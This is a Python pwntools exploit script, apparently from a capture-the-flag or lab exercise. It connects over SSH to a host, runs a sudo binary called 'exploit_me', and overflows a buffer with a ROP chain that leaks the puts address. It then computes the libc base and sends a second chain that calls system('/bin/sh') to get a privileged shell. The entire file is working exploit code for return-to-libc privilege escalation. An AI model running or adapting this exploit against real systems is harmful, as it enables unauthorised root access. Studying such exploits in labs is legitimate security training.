from pwn import *
# Sometime we need to change context if ELF does not work
context.arch = "amd64"

elf = ELF("./exploit_me",checksec=False)

# using ssh for remote use
shell = ssh('zeeshan', '10.10.31.178', keyfile='../id_rsa', port=22)	
io = shell.process(['sudo','/exploit_me'])	
# io = elf.process()

# initializing a rop
rop = ROP(elf)
# adding to the chain
rop.call("puts",[elf.got['puts']])
rop.call("main")

payload = [
			b"A"*40,
			rop.chain()		
			]

payload = b"".join(payload)

print(io.recv().decode())
io.sendline(payload)

puts = u64(io.recvuntil(b"\n").rstrip().ljust(8,b'\0'))
log.info(f"puts found at {hex(puts)}")
print(io.recvuntil("\n").decode())

# always use same libc as targe else it will f**k the payload
libc = ELF("./libc.so.6",checksec=False)
libc.address = puts - libc.symbols["puts"]
log.info(f"base address libc => {hex(libc.address)}")
rop = ROP(libc)
rop.call("system",[next(libc.search(b"/bin/sh\x00"))])
rop.call("exit")

#final payload to call /bin/sh

payload = [
			b"A"*40,
			rop.chain()		
			]

payload = b"".join(payload)
io.sendline(payload)
io.interactive()


write("payload.txt",payload)



